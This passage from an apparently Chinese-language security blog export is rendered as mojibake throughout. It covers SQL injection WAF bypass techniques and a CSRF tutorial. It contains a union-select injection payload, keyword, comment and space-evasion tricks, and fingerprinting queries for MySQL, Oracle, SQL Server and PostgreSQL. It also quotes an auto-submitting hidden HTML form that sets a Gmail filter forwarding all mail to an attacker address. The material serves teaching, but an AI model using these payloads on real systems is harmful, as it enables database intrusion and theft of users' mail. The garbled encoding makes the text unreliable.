å…¥ä¸¤ä¸ªåéƒ½ä¸ºidçš„å‚æ•°æ—¶ï¼Œwafè·å–çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œå¿½ç•¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œåˆ™å¯¹ç¬¬äºŒä¸ªå‚æ•°çš„å†…å®¹ä¸åšä»»ä½•æ£€æŸ¥å’Œè¿‡æ»¤ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå‚æ•°å°±å¯ä»¥ä¼ å…¥åˆ°apacheæœåŠ¡å™¨ç«¯ï¼Œè¿›è¡Œè§£æã€‚ æˆ‘ä»¬åœ¨urlåé¢è¾“å…¥login.phpè¿›å…¥åˆ°å—wafä¿æŠ¤çš„ç•Œé¢ ?id=0&amp;id=-1' union select 1,2,database() --+ 5.8 é¢„ç¼–è¯‘ç»•è¿‡ 5.8.1 ç®€ä»‹ SQLæ³¨å…¥æ˜¯å› ä¸ºè§£é‡Šå™¨å°†ä¼ å…¥çš„æ•°æ®å½“æˆå‘½ä»¤æ‰§è¡Œè€Œå¯¼è‡´çš„ï¼Œé¢„ç¼–è¯‘æ˜¯ç”¨äºè§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ç§æ–¹æ³•ã€‚å’Œæ™®é€šçš„æ‰§è¡Œæµç¨‹ä¸åŒï¼Œé¢„ç¼–è¯‘å°†ä¸€æ¬¡æŸ¥è¯¢é€šè¿‡ä¸¤æ¬¡äº¤äº’å®Œæˆï¼Œç¬¬ä¸€æ¬¡äº¤äº’å‘é€æŸ¥è¯¢è¯­å¥çš„æ¨¡æ¿ï¼Œç”±åç«¯çš„SQLå¼•æ“è¿›è¡Œè§£æä¸ºASTæˆ–Opcodeï¼Œç¬¬äºŒæ¬¡äº¤äº’å‘é€æ•°æ®ï¼Œä»£å…¥ASTæˆ–Opcodeä¸­æ‰§è¡Œã€‚å› ä¸ºæ­¤æ—¶è¯­æ³•è§£æå·²ç»å®Œæˆï¼Œæ‰€ä»¥ä¸ä¼šå†å‡ºç°æ··æ·†æ•°æ®å’Œä»£ç çš„è¿‡ç¨‹ã€‚ 5.8.2 æ¨¡æ‹Ÿé¢„ç¼–è¯‘ ä¸ºäº†é˜²æ­¢ä½ç‰ˆæœ¬æ•°æ®åº“ä¸æ”¯æŒé¢„ç¼–è¯‘çš„æƒ…å†µï¼Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘ä¼šåœ¨å®¢æˆ·ç«¯å†…éƒ¨æ¨¡æ‹Ÿå‚æ•°ç»‘å®šçš„è¿‡ç¨‹ï¼Œè¿›è¡Œè‡ªå®šä¹‰çš„è½¬ä¹‰ã€‚ 5.8.3 ç»•è¿‡ 5.8.3.1 é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯ é¢„ç¼–è¯‘åªæ˜¯ä½¿ç”¨å ä½ç¬¦æ›¿ä»£çš„å­—æ®µå€¼çš„éƒ¨åˆ†ï¼Œå¦‚æœç¬¬ä¸€æ¬¡äº¤äº’ä¼ å…¥çš„å‘½ä»¤ä½¿ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½¿å¾—å‘½ä»¤æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œé‚£ä¹ˆé¢„ç¼–è¯‘ä¸ä¼šç”Ÿæ•ˆã€‚ 5.8.3.2 éƒ¨åˆ†å‚æ•°ä¸å¯é¢„ç¼–è¯‘ åœ¨æœ‰çš„æƒ…å†µä¸‹ï¼Œæ•°æ®åº“å¤„ç†å¼•æ“ä¼šæ£€æŸ¥æ•°æ®è¡¨å’Œæ•°æ®åˆ—æ˜¯å¦å­˜åœ¨ï¼Œå› æ­¤æ•°æ®è¡¨åå’Œåˆ—åä¸èƒ½è¢«å ä½ç¬¦æ‰€æ›¿ä»£ã€‚è¿™ç§æƒ…å†µä¸‹å¦‚æœè¡¨åå’Œåˆ—åå¯æ§ï¼Œåˆ™å¯èƒ½å¼•å…¥æ¼æ´ã€‚ 5.8.3.3 é¢„ç¼–è¯‘å®ç°é”™è¯¯ éƒ¨åˆ†è¯­è¨€å¼•æ“åœ¨å®ç°ä¸Šå­˜åœ¨ä¸€å®šé—®é¢˜ï¼Œå¯èƒ½ä¼šå­˜åœ¨ç»•è¿‡æ¼æ´ã€‚ 5.9 ç»•è¿‡orå’Œandçš„ 1ã€å¤§å°å†™å˜å½¢ï¼šå°†åŸæœ¬çš„ or å’Œ and æ›¿æ¢ä¸ºï¼šOrã€oRã€Andã€ANDã€aNDã€aNdç­‰ç­‰ã€‚ 2ã€è½¬æ¢ç¼–ç è¾“å…¥ï¼šå°† or å’Œ and ä½¿ç”¨hexï¼Œurlencodeç­‰ç¼–ç æ–¹å¼è¿›è¡Œè½¬æ¢ååœ¨è¾“å…¥ã€‚ 3ã€æ·»åŠ æ³¨é‡Šï¼ˆå†…è”æ³¨é‡Šï¼‰ï¼šä¾‹å¦‚ï¼š/*or*/ï¼Œä¸­é—´çš„è¯­å¥ä¼šè¢«mysqlä¸­è§£æï¼ˆä¸€èˆ¬å…¶ä»–æ•°æ®åº“ä¸ä¼šï¼‰ æ³¨é‡Šç¬¦å¦‚ä¸‹: # --+ /*xxx*/ /*!xxx*/ /*!50000xxx*/ 4ã€åŒå†™ç»•è¿‡ï¼šä¾‹å¦‚ï¼šoorrï¼Œaandnd ç­‰ã€‚ 5ã€å¯ä»¥ä½¿ç”¨%26%26ä»£æ›¿andã€‚%26 ä»£è¡¨å­—ç¬¦ '&amp;' ã€‚æœ‰æ—¶å€™&amp;&amp;ä¸èƒ½ç”¨ä½†æ˜¯å¯ä»¥ä½¿ç”¨%26%26åæ­£å°±è¿™ä¸¤ä¸ªè½®æ¢ç€è¯•éªŒï¼Œå“ªä¸ªå¯è¡Œç”¨å“ªä¸ªã€‚ 6ã€åˆ©ç”¨ç¬¦å·ï¼šandæ›¿æ¢ä¸º&amp;&amp;ã€oræ›¿æ¢ä¸º|| 5.10 ç»•è¿‡ç©ºæ ¼å’Œæ³¨é‡Šç¬¦ ç»•è¿‡æ³¨é‡Šç¬¦æ–¹æ³•ï¼šä½¿ç”¨ or '1'='1 æˆ–è€… and '1'='1 æ›¿æ¢ï¼Œè¿™é‡Œç†è§£ä¸€ä¸‹æ³¨é‡Šç¬¦å·çš„ä½œç”¨å°±å¯ä»¥ï¼Œæˆ‘ä»¬åªè¦æŠŠåé¢çš„ç¬¦å·æƒ³åŠæ³•é—­åˆå°±å¯ä»¥ï¼Œå•å¼•å·å¯ä»¥éšæ—¶æ›¿æ¢ï¼Œä¸»è¦æ˜¯æ ¹æ®sqlè¯­å¥çš„é—­åˆæ–¹å¼å†³å®šä½¿ç”¨ä»€ä¹ˆç¬¦å·é—­åˆã€‚ ç»•è¿‡ç©ºæ ¼æ–¹æ³•ï¼š 1ã€/**/ï¼ˆæ³¨é‡Šç»•è¿‡ï¼‰ 2ã€%09 Tabé”®ï¼ˆæ°´å¹³ï¼‰ 3ã€%0a æ–°å»ºä¸€è¡Œ 4ã€%0c æ–°çš„ä¸€é¡µ 5ã€%0d return é”® 6ã€%0b Tabé”®ï¼ˆå‚ç›´ï¼‰ 7ã€%a0 ç©ºæ ¼ 8ã€() ç»•è¿‡ï¼Œä¸»è¦é€šè¿‡æ‹¬å·å»å°†æŸäº›è¯­å¥ç‹¬ç«‹èµ·æ¥ï¼Œè¿™æ ·å°±ä¸éœ€è¦ç©ºæ ¼äº†ã€‚ ä»¥ä¸Šéƒ½å¯ä»¥ç”¨æ¥ç»•è¿‡ã€‚ä¸€èˆ¬è¿‡æ»¤äº†ç©ºæ ¼ä¹‹åï¼Œè”åˆæ³¨å…¥ä»¥åŠåŒæŸ¥è¯¢æ³¨å…¥ç­‰å°±ä¸æ¨èä½¿ç”¨äº†ï¼ˆWindowsç³»ç»Ÿçš„å‰æï¼Œå¦‚æœæ˜¯LINUXç³»ç»Ÿç›´æ¥ä½¿ç”¨ç­‰ä»·å­—ç¬¦ç»•è¿‡ç©ºæ ¼å°±å¯ä»¥ï¼‰ï¼Œæœ€å¥½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ä¸­çš„ extractvalue()å‡½æ•° ä»¥åŠ updatexml()å‡½æ•° è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚ 0x06 Mysqlå¸¸è§å‡½æ•° =ã€&gt;ã€&gt;=ã€&lt;= ã€&lt;&gt; æ¯”è¾ƒè¿ç®—ç¬¦ andã€or é€»è¾‘è¿ç®—ç¬¦ version( ) mysqlæ•°æ®åº“ç‰ˆæœ¬ database( ) å½“å‰æ•°æ®åº“å sleep( ) ç¡çœ æ—¶é—´ä¸ºæŒ‡å®šçš„ç§’æ•° if(true,t,f) ifåˆ¤æ–­ length( ) è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ substring( ) æˆªå–å­—ç¬¦ä¸²ä¸‰ä¸ªå‡½æ•°ä½œç”¨ç›¸åŒæœ‰ä¸‰ä¸ªå‚æ•° mid(â€œ1â€,2,3)1.æˆªå–çš„å­—ç¬¦ä¸²2.æˆªå–èµ·å§‹ä½ç½®ï¼Œä»1å¼€å§‹è®¡æ•°3.æˆªå–é•¿åº¦ substr( ) æˆªå–å­—ç¬¦ä¸²ä¸‰ä¸ªå‡½æ•°ä½œç”¨ç›¸åŒæœ‰ä¸‰ä¸ªå‚æ•° mid(â€œ1â€,2,3)1.æˆªå–çš„å­—ç¬¦ä¸²2.æˆªå–èµ·å§‹ä½ç½®ï¼Œä»1å¼€å§‹è®¡æ•°3.æˆªå–é•¿åº¦ mid( ) æˆªå–å­—ç¬¦ä¸²ä¸‰ä¸ªå‡½æ•°ä½œç”¨ç›¸åŒæœ‰ä¸‰ä¸ªå‚æ•° mid(â€œ1â€,2,3)1.æˆªå–çš„å­—ç¬¦ä¸²2.æˆªå–èµ·å§‹ä½ç½®ï¼Œä»1å¼€å§‹è®¡æ•°3.æˆªå–é•¿åº¦ left( ) ä»å·¦ä¾§å¼€å§‹å–æŒ‡å®šå­—ç¬¦ä¸ªæ•°çš„å­—ç¬¦ä¸² concat( ) æ²¡æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸² concat_ws ( ) å«æœ‰åˆ†å‰²ç¬¦çš„è¿æ¥å­—ç¬¦ä¸² group_conat( ) è¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸² ord( ) è¿”å›ASCIIç  ascii( ) è¿”å›ASCIIç  hex( ) å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶ unhex( ) hexçš„åå‘æ“ä½œ md5( ) è¿”å›MD5å€¼ floor(x) è¿”å›ä¸å¤§äºxçš„æœ€å¤§æ•´æ•° round ( ) è¿”å›å‚æ•°xæ¥è¿‘çš„æ•´æ•° rand( ) è¿”å›0-1ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•° load_file( ) è¯»å–æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸² find_in_set( ) è¿”å›å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„ä½ç½® benchmark( ) æŒ‡å®šè¯­å¥æ‰§è¡Œçš„æ¬¡æ•° name_const ( ) è¿”å›è¡¨ä½œä¸ºç»“æœ user( ) ç”¨æˆ·å current_user( ) å½“å‰ç”¨æˆ·å system_ user( ) ç³»ç»Ÿç”¨æˆ·å @@datadir æ•°æ®åº“è·¯å¾„ @@versoin_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬ user() //è¿”å›å½“å‰ä½¿ç”¨æ•°æ®åº“çš„ç”¨æˆ· version() //è¿”å›å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ database() //è¿”å›å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ group_concat() //å¤šè¡Œæ•°æ®æ‹¼æ¥è‡³ä¸€è¡Œæ˜¾ç¤º+group_byæ ¹æ®åˆ†ç»„æ’åº concat_ws() //æŠŠä¸åŒåˆ—çš„æ•°æ®ä»¥ç‰¹å®šå­—ç¬¦éš”å¼€ # -- --+ //åœ¨MYSQLä¸­çš„æ³¨é‡Šç¬¦ ï¼ˆæ³¨æ„:æœ‰æ—¶å€™æ³¨é‡Šç¬¦éœ€è¦å¤šè¯•å‡ ç§ï¼Œæœ‰çš„æ—¶å€™--+ä¸è¡Œï¼Œä½†æ˜¯#å¯ä»¥ï¼‰ order by //æ’åºå‡½æ•° åˆ¤æ–­åˆ— åŸç†ï¼šorder by åé¢è·Ÿå“ªä¸ªåˆ—åå°±æ˜¯é€šè¿‡è·Ÿå“ªä¸ªåˆ—è¿›è¡Œæ’åºï¼Œå¦‚æœåé¢è·Ÿçš„æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆ1å°±ä»£è¡¨æ ¹æ®ç¬¬ä¸€åˆ—æ’åºï¼Œ2ä»£è¡¨ç¬¬äºŒåˆ—ï¼Œ3ä»£è¡¨ç¬¬ä¸‰åˆ—ï¼Œé‚£ä¹ˆä¸€ç›´è¾“å…¥æ•°å­—çš„å¤§å°å°±å¯ä»¥åˆ¤æ–­æ•°æ®è¡¨æœ‰å¤šå°‘åˆ—äº† count() //è®¡æ•°å‡½æ•° æŠ¥é”™æ—¶å€™å¯ä»¥ç”¨åˆ°ï¼Œæˆ–è€…å¸ƒå°”æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥æ—¶æŸ¥è¯¢æœ‰å¤šå°‘ä¸ªè¡¨ï¼Œå¤šå°‘ä¸ªåˆ—çš„æ—¶å€™å¯ä»¥ç”¨åˆ° rand() //äº§ç”Ÿä¸€ä¸ªéšæœºæ•°è¿”å›çš„éšæœºæ•°æ˜¯å¤§äºç­‰äº 0 åŠå°äº 1 çš„å‡åŒ€åˆ†å¸ƒéšæœºå®æ•° æŠ¥é”™æ³¨å…¥æ—¶å€™æœ‰ç”¨ updatexml(XML_document, XPath_string, new_value); ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ extractvalue() :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•° å…¶å®å°±æ˜¯ç›¸å½“äºæˆ‘ä»¬ç†Ÿæ‚‰çš„HTMLæ–‡ä»¶ä¸­ç”¨ &lt;div&gt;&lt;p&gt;&lt;a&gt;æ ‡ç­¾æŸ¥æ‰¾å…ƒç´ ä¸€æ · è¯­æ³•ï¼šextractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„) ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚ INFORMATION_SCHEMAæ•°æ®åº“ mysql5.0ä»¥ä¸‹æ²¡æœ‰è¯¥è¡¨ 0x07 æ•°æ®åº“æ£€æµ‹ 7.1 MySQL sleep sleep(1) benchmark BENCHMARK(5000000, MD5('test')) å­—ç¬¦ä¸²è¿æ¥ SELECT 'a' 'b'``SELECT CONCAT('some','string') version SELECT @@version``SELECT version() è¯†åˆ«ç”¨å‡½æ•° connection_id()``last_insert_id()``row_count() 7.2 Oracle å­—ç¬¦ä¸²è¿æ¥ 'a'||'oracle' --``SELECT CONCAT('some','string') version SELECT banner FROM v$version``SELECT banner FROM v$version WHERE rownum=1 7.3 SQLServer WAITFOR WAITFOR DELAY '00:00:10'; SERVERNAME SELECT @@SERVERNAME version SELECT @@version å­—ç¬¦ä¸²è¿æ¥ SELECT 'some'+'string' å¸¸é‡ @@pack_received``@@rowcount 7.4 PostgreSQL sleep pg_sleep(1)","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…æCSRFæ¼æ´","path":"/2023/08/06/qian-xi-csrf-lou-dong/","content":"1ã€CSRFæ¼æ´ä»‹ç» CSRF(Cross-Site Request Forgery,è·¨ç«™è¯·æ±‚ä¼ªé€ )ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRF .å®ƒæ˜¯ä¸€ç§å¸¸è§çš„ Webæ”»å‡»æ–¹å¼ã€‚æ˜¯ä¸€ç§åŠ«æŒç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„æ“ä½œä¸€ç§æ”»å‡». è¯´çš„ç›´ç™½ä¸€ç‚¹å°±æ˜¯:åˆ«äººç›—ç”¨(åŠ«æŒ)ä½ çš„èº«ä»½å»åšåäº‹. ï¼ˆ1ï¼‰åˆ«äºº--&gt;è¿™é‡ŒæŒ‡çš„æ˜¯æ”»å‡»è€… ï¼ˆ2ï¼‰ä½ ----&gt;Aç«™(webæœåŠ¡å™¨)ä¸Šæ³¨å†Œçš„åˆæ³•ç”¨æˆ·(å®¢æˆ·ç«¯) ï¼ˆ3ï¼‰åšåäº‹---&gt;å»è¯·æ±‚åˆæ³•ç«™ç‚¹A(æ¯”å¦‚webæœåŠ¡å™¨)å­˜åœ¨CSRFæ”»å‡»çš„URL,å®ç°ç±»ä¼¼å‘é€æ¶æ„é‚®ä»¶/è½¬è´¦/åˆ›å»ºè´¦æˆ·/ä¿®æ”¹å¯†ç ç­‰\"ä½ ä¸å¸Œæœ›æ‰§è¡Œ\"æ“ä½œ. 1.1 å±å®³ ä»¥ç”¨æˆ·çš„åä¹‰å‘é‚®ä»¶/å‘æ¶ˆæ¯ è½¬æ¢/è´­ä¹°å•†å“ç­‰; ä¿®æ”¹å¯†ç ; åˆ é™¤æ–‡ç« ç­‰ 2ã€CSRFæ¼æ´çš„åŸç† 2.1 CSRFæ¼æ´äº§ç”Ÿçš„åŸå›  (1)httpåè®®ä½¿ç”¨sessionåœ¨æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯,å®¢æˆ·ç«¯æµè§ˆå™¨ç”¨cookieæ ‡è¯†ç”¨æˆ·èº«ä»½; (2)cookieçš„è®¤è¯åªèƒ½ç¡®ä¿æ˜¯æŸä¸ªç”¨æˆ·å‘é€çš„è¯·æ±‚,ä½†æ˜¯ä¸èƒ½ä¿è¯è¿™ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯\"ç”¨æˆ·è‡ªæ„¿çš„è¡Œä¸º\". (3)è¿™æ—¶,ç”¨æˆ·ç™»å½•äº†æŸä¸ªwebç«™ç‚¹,åŒæ—¶ç‚¹å‡»äº†åŒ…å«CSRFæ¶æ„ä»£ç çš„URL,å°±ä¼šè§¦å‘CSRF 2.2 æ¼æ´åˆ©ç”¨çš„æ¡ä»¶ (1)ç”¨æˆ·å¿…é¡»ç™»å½•Aç½‘ç«™,ç”Ÿæˆäº†cookie (2)ç™»å½•çš„åŒæ—¶è®¿é—®äº†æ¶æ„URL(åŒ…å«CSRFæ¶æ„ä»£ç çš„URL). 2.3 CSRFå’ŒXSSçš„ä¸åŒ (1)XSSä¸»è¦ç”¨æˆ·è·å–ç”¨æˆ·çš„cookieä¿¡æ¯,è¾¾åˆ°æ§åˆ¶å®¢æˆ·ç«¯çš„ç›®çš„ XSS----&gt;æŠŠä½ çš„è…°ç‰Œ(ç”¨æˆ·èº«ä»½è±¡å¾ä¹Ÿå°±æ˜¯cookie)å·åˆ°æ‰‹,é»‘å®¢è‡ªå·±å»æç ´å. CSRFä¸»è¦æ˜¯åŠ«æŒç”¨æˆ·èº«ä»½,è®©å®¢æˆ·ç«¯åšä¸€äº›ä¸æ„¿æ„åšçš„äº‹. CSRF----&gt;æ‹¿åˆ€åŠ«æŒä½ ,\"å€ŸåŠ©ä½ çš„èº«ä»½\"æ¥å¸®é»‘å®¢åšäº‹. (2)å±å®³ä¸Šæ¥è¯´,XSSæ›´å¤§; (3)ä»åº”ç”¨éš¾åº¦ä¸Šæ¥è¯´ CSRFéœ€è¦æ»¡è¶³ç™»å½•æŸç½‘ç«™çš„çŠ¶æ€,åŒæ—¶è®¿é—®äº†æ¶æ„çš„URL,åº”ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ». XSSåªè¦ä¸€æ¬¡ç‚¹å‡»æˆ–è€…å­˜å‚¨åˆ°æœåŠ¡å™¨å³å¯. 3ã€CSRFä¹‹GETå‹ä»£ç åˆ†æ GETå‹CSRFä»£ç ä¸¾ä¾‹ é—®é¢˜ï¼š ï¼ˆ1ï¼‰ä½†æ˜¯URLç›´æ¥å†™ç”¨æˆ·åå’Œå¯†ç çš„æ–¹å¼å¤ªè¿‡äºæ˜æ˜¾,æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®é¡µé¢çš„æ–¹å¼è¿›è¡Œä¼ªè£…; ï¼ˆ2ï¼‰æˆ–è€…é€šè¿‡XSSé¡µé¢,ç›´æ¥æŠŠè¿™ä¸ªæ¶æ„URLé“¾æ¥å‘ç»™å®¢æˆ·ç«¯,åœ¨å®¢æˆ·ç™»å½•é¡µé¢çš„åŒæ—¶è®¿é—®è¿™ä¸ªæ¶æ„URL,ä¹Ÿå¯ä»¥åˆ›å»ºç”¨æˆ·; ï¼ˆ3ï¼‰é€šè¿‡ä¼ªé€ é¡µé¢è¯±å¯¼å®¢æˆ·ç‚¹å‡» 4ã€CSRFä¹‹POSTå‹ä»£ç åˆ†æ ï¼ˆ1ï¼‰æœ‰äººè¯´,GETæ–¹å¼å®¹æ˜“å‡ºç°CSRFæ”»å‡»,é‚£ç”¨postæ˜¯ä¸æ˜¯å°±å¯ä»¥ä¸‡æ— ä¸€å¤±å‘¢? ï¼ˆ2ï¼‰å½“ç„¶ä¸æ˜¯,å› ä¸ºpoståªæ˜¯æäº¤çš„æ–¹å¼æ”¹å˜äº†,å¦‚æœåŸå§‹é¡µé¢è¿˜æ˜¯å­˜åœ¨CSRFæ¼æ´,æˆ‘ä»¬è‡ªå·±åˆ›å»ºä¸€ä¸ªPOSTé¡µé¢æ¥æ¨¡æ‹Ÿç”¨æˆ·æäº¤æ•°æ®,è¿˜æ˜¯å¯ä»¥è¿›è¡Œåˆ©ç”¨çš„ ï¼ˆ3ï¼‰post_csrf.phpç”¨æ¥æ¨¡æ‹Ÿå­˜åœ¨csrfæ¼æ´çš„webé¡µé¢,ä»£ç å¦‚ä¸‹ï¼š ï¼ˆ4ï¼‰é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹ï¼š postå‹éœ€è¦é»‘å®¢è‡ªå·±æ¥æ„é€ è¡¨å•æäº¤çš„å‚æ•° ä¸ºäº†ä¸æ˜“å‘ç°,æäº¤è¡¨å•çš„æ•°æ®éƒ½ç›´æ¥éšè—hidden; post.htmlä»£ç å¦‚ä¸‹: 5ã€DVWAä¸­CSRFåˆ©ç”¨å®æˆ˜ 5.1 æŒ–æ˜CSRFçš„æ–¹æ³•: (1)ä½¿ç”¨burpæŠ“åŒ…åä¿®æ”¹Refererå­—æ®µå†é‡æ–°æäº¤,å¦‚æœèƒ½è¯·æ±‚å°±å­˜åœ¨CSRFæ¼æ´. (2)å…¶ä»–CSRFå·¥å…·,æ¯”å¦‚ CSRFTesterå°±æ˜¯é€šè¿‡æŠ“å–æäº¤å‚æ•°; ä¿®æ”¹è¡¨å•ä¿¡æ¯,é‡æ–°æäº¤;-----&gt;ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ é‡æ–°æäº¤æˆåŠŸå°±å­˜åœ¨CSRFæ¼æ´. DVWAä¸­lowçº§åˆ«CSRF:æ²¡æœ‰å¯¹è¾“å…¥åšè¿‡æ»¤,è€Œä¸”ä¹Ÿæ²¡æœ‰åŸå¯†ç è®¤è¯ 6ã€csrfæ¡ˆä¾‹ 6.1 Gmail å°æ˜çš„æ‚²æƒ¨é­é‡ è¿™ä¸€å¤©ï¼Œå°æ˜åŒå­¦ç™¾æ— èŠèµ–åœ°åˆ·ç€Gmailé‚®ä»¶ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯æ²¡è¥å…»çš„é€šçŸ¥ã€éªŒè¯ç ã€èŠå¤©è®°å½•ä¹‹ç±»ã€‚ä½†æœ‰ä¸€å°é‚®ä»¶å¼•èµ·äº†å°æ˜çš„æ³¨æ„ï¼š ç”©å–æ¯”ç‰¹å¸ï¼Œä¸€ä¸ªåªè¦998ï¼ï¼ èªæ˜çš„å°æ˜å½“ç„¶çŸ¥é“è¿™ç§è‚¯å®šæ˜¯éª—å­ï¼Œä½†è¿˜æ˜¯æŠ±ç€å¥½å¥‡çš„æ€åº¦ç‚¹äº†è¿›å»ï¼ˆè¯·å‹¿æ¨¡ä»¿ï¼‰ã€‚æœç„¶ï¼Œè¿™åªæ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½æ²¡æœ‰çš„ç©ºç™½é¡µé¢ï¼Œå°æ˜å¤±æœ›çš„å…³é—­äº†é¡µé¢ã€‚ä¸€åˆ‡ä¼¼ä¹ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿâ€¦â€¦ åœ¨è¿™å¹³é™çš„å¤–è¡¨ä¹‹ä¸‹ï¼Œé»‘å®¢çš„æ”»å‡»å·²ç„¶å¾—æ‰‹ã€‚å°æ˜çš„Gmailä¸­ï¼Œè¢«å·å·è®¾ç½®äº†ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œè¿™ä¸ªè§„åˆ™ä½¿å¾—æ‰€æœ‰çš„é‚®ä»¶éƒ½ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°hacker@hackermail.comã€‚å°æ˜è¿˜åœ¨ç»§ç»­åˆ·ç€é‚®ä»¶ï¼Œæ®Šä¸çŸ¥ä»–çš„é‚®ä»¶æ­£åœ¨ä¸€å°å°åœ°ï¼Œå¦‚è„±ç¼°çš„é‡é©¬ä¸€èˆ¬åœ°ï¼ŒæŒç»­ä¸æ–­åœ°å‘ç€é»‘å®¢çš„é‚®ç®±è½¬å‘è€Œå»ã€‚ ä¸ä¹…ä¹‹åçš„ä¸€å¤©ï¼Œå°æ˜å‘ç°è‡ªå·±çš„åŸŸåå·²ç»è¢«è½¬è®©äº†ã€‚æ‡µæ‡‚çš„å°æ˜ä»¥ä¸ºæ˜¯åŸŸååˆ°æœŸè‡ªå·±å¿˜äº†ç»­è´¹ï¼Œç›´åˆ°æœ‰ä¸€å¤©ï¼Œå¯¹æ–¹å¼€å‡ºäº† $650 çš„èµå›ä»·ç ï¼Œå°æ˜æ‰å¼€å§‹è§‰å¾—ä¸å¤ªå¯¹åŠ²ã€‚ å°æ˜ä»”ç»†æŸ¥äº†ä¸‹åŸŸåçš„è½¬è®©ï¼Œå¯¹æ–¹æ˜¯æ‹¥æœ‰è‡ªå·±çš„éªŒè¯ç çš„ï¼Œè€ŒåŸŸåçš„éªŒè¯ç åªå­˜åœ¨äºè‡ªå·±çš„é‚®ç®±é‡Œé¢ã€‚å°æ˜å›æƒ³èµ·é‚£å¤©å¥‡æ€ªçš„é“¾æ¥ï¼Œæ‰“å¼€åé‡æ–°æŸ¥çœ‹äº†â€œç©ºç™½é¡µâ€çš„æºç ï¼š &lt;form method=\"POST\" action=\"https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"cf2_emc\" value=\"true\"/&gt; &lt;input type=\"hidden\" name=\"cf2_email\" value=\"hacker@hakermail.com\"/&gt; ..... &lt;input type=\"hidden\" name=\"irf\" value=\"on\"/&gt; &lt;input type=\"hidden\" name=\"nvp_bu_cftb\" value=\"Create Filter\"/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; è¿™ä¸ªé¡µé¢åªè¦æ‰“å¼€ï¼Œå°±ä¼šå‘Gmailå‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚è¯·æ±‚ä¸­ï¼Œæ‰§è¡Œäº†â€œCreate Filterâ€å‘½ä»¤ï¼Œå°†æ‰€æœ‰çš„é‚®ä»¶ï¼Œè½¬å‘åˆ°â€œhacker@hackermail.comâ€ã€‚ 